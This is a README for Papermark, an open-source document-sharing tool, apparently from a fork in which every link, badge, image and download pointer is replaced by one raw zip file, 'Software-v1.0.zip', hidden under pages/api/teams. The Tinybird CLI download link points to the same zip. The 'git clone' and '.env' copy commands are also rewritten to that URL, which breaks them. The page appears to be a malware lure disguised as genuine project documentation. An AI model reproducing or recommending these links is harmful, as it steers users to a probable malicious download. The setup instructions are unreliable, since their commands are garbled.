<div align="center">
  <h1 align="center">Papermark</h1>
  <h3>The open-source DocSend alternative.</h3>

<a target="_blank" href="https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip;utm_medium=badge&amp;utm_souce=badge-papermark"><img src="https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip;theme=light&amp;period=daily" alt="Papermark - The open-source DocSend alternative | Product Hunt" style="width:250px;height:40px"></a>

</div>

<div align="center">
  <a href="https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip">https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip</a>
</div>

<br/>

<div align="center">
  <a href="https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip"><img alt="GitHub Repo stars" src="https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip"></a>
  <a href="https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip"><img alt="Twitter Follow" src="https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip"></a>
  <a href="https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip"><img alt="License" src="https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip"></a>
</div>

<br/>

Papermark is the open-source document sharing alternative to DocSend with built-in analytics and custom domains.

## Features

- **Shareable Links:** Share your document securely by sending a custom link
- **Custom Branding:** Add a custom domain and your own branding
- **Analytics:** Get insights via document tracking and soon page-by-page analytics
- **Self-hosted, open-source:** Host it yourself and hack on it

## Demo

![Papermark Welcome GIF](https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip)

## Tech Stack

- [https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip](https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip) – Framework
- [Typescript](https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip) – Language
- [Tailwind](https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip) – CSS
- [shadcn/ui](https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip) - UI Components
- [Prisma](https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip) - ORM
- PostgreSQL - Database
- [https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip](https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip) – Authentication
- [Tinybird](https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip) – Analytics
- [Resend](https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip) – Email
- [Stripe](https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip) – Payments
- [Vercel](https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip) – Hosting

## Getting Started

### Prerequisites

Here's what you need to be able to run Papermark:

- https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip (version >= 18)
- PostgreSQL Database
- Blob storage (currently [AWS S3](https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip) or [Vercel Blob](https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip))
- [Resend](https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip) (for sending emails)

### 1. Clone the repository

```shell
git clone https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip
cd papermark
```

### 2. Install npm dependencies

```shell
npm install
```

### 3. Copy the environment variables to `.env` and change the values

```shell
cp https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip .env
```

### 4. Initialize the database

```shell
npx prisma generate
npx prisma migrate deploy
```

### 5. Run the dev server

```shell
npm run dev
```

### 6. Open the app in your browser

Visit [http://localhost:3000](http://localhost:3000) in your browser.

## Tinybird instructions

To prepare the Tinybird database, follow these steps:

0. We use `pipenv` to manage my Python dependencies. If you don't have it installed, you can install it using the following command:
   ```sh
   pkgx pipenv
   ```
1. Download the Tinybird CLI from [here](https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip) and install it on your system.
2. After authenticating with the Tinybird CLI, navigate to the `lib/tinybird` directory:
   ```sh
   cd lib/tinybird
   ```
3. Push the necessary datasources using the following command:
   ```sh
   tb push datasources/*
   tb push endpoints/get_*
   ```
4. Don't forget to set the `TINYBIRD_TOKEN` with the appropriate rights in your `.env` file.

#### Updating Tinybird

```sh
pipenv shell
## start: pkgx-specific
cd ..
cd papermark
## end: pkgx-specific
pipenv update tinybird-cli
```

## Contributing

Papermark is an open-source project and we welcome contributions from the community.

If you'd like to contribute, please fork the repository and make changes as you'd like. Pull requests are warmly welcome.

### Our Contributors ✨

<a href="https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip">
  <img src="https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip" />
</a>
